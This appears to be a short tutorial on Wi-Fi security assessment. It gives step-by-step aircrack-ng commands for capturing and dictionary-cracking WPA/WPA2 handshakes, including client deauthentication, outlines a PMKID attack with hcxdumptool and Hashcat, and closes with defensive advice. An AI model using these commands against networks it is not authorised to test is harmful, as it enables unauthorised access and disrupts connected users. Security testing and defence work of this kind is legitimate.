# Wi-Fi Hacking and Security Assessment

This document covers standard techniques for assessing the security of Wi-Fi networks, primarily focusing on WPA2/WPA3 and legacy WEP.

## WPA/WPA2 Handshake Capture (Aircrack-ng)
To crack a WPA/WPA2 network, you typically need to capture a 4-way handshake.
1. **Put Wireless Interface into Monitor Mode:**
   `airmon-ng start wlan0`
2. **Scan for Target Networks:**
   `airodump-ng wlan0mon`
3. **Capture Traffic for a Specific BSSID (Target):**
   `airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon`
4. **Deauthenticate a Client (to force handshake):**
   `aireplay-ng -0 2 -a [BSSID] -c [Client_MAC] wlan0mon`
5. **Crack the Handshake with a Dictionary:**
   `aircrack-ng -w wordlist.txt -b [BSSID] capture-01.cap`

## PMKID Attack
Discovered by Hashcat, this attack does not require capturing a full 4-way handshake and doesn't require any clients to be connected to the network. It retrieves the PMKID from the AP's RSN IE (Robust Security Network Information Element).
1. Run `hcxdumptool` to capture PMKID frames.
2. Extract the hash using `hcxpcapngtool`.
3. Crack the hash with Hashcat using mode `16800` (or `22000` for WPA-PBKDF2-PMKID+EAPOL).

## Defending Wi-Fi Networks
- **Use WPA3:** Upgrading to WPA3 mitigates offline dictionary attacks via Simultaneous Authentication of Equals (SAE).
- **Strong Passphrases:** Use long, randomized passphrases (20+ characters) to defeat dictionary and brute-force attacks on WPA2.
- **Disable WPS:** Wi-Fi Protected Setup (WPS) is highly vulnerable to brute-force attacks (e.g., Reaver). Disable it on the router.
